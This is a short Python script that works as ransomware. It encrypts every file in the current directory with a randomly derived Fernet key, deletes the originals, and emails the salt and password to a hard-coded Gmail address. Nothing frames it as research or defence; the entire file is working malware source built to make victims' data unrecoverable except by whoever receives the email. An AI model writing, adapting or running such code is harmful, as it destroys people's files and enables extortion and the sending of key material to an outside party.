import os
import smtplib
import base64
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

# The email address and password of the sender
sender_email = ""
sender_password = ""

# The email address of the recipient
recipient_email = "dhruvtyagi01@gmail.com"

# The password used to generate the encryption key
password = os.urandom(16)
# The salt used to generate the encryption key
salt = os.urandom(16)

# Generate the encryption key using the PBKDF2 (Password-Based Key Derivation Function 2) algorithm
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100000
)
key = base64.urlsafe_b64encode(kdf.derive(password))

# Initialize the Fernet class with the encryption key
fernet = Fernet(key)

# Iterate through all the files in the current directory
for file in os.listdir():
    # Skip directories and encrypted files
    if not os.path.isfile(file) or file.endswith(".encrypted") or file.startswith("main"):
        continue

    # Read the contents of the file
    with open(file, "rb") as f:
        data = f.read()

    # Encrypt the contents of the file
    encrypted_data = fernet.encrypt(data)

    # Write the encrypted data to a new file with the same name and the ".encrypted" extension
    with open(file + ".encrypted", "wb") as f:
        f.write(encrypted_data)

    # Delete the original file
    os.remove(file)

# Create the email message
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = recipient_email
message["Subject"] = "Encryption Key"

# Add the salt and password used to generate the key to the email message
key_data = f"Salt: {base64.b64encode(salt).decode()}\nPassword: {password}"
message.attach(MIMEText(key_data))

# Send the email message
with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
    server.login(sender_email, sender_password)
    server.sendmail(sender_email, recipient_email, message.as_string())

print("Encryption key sent to email address")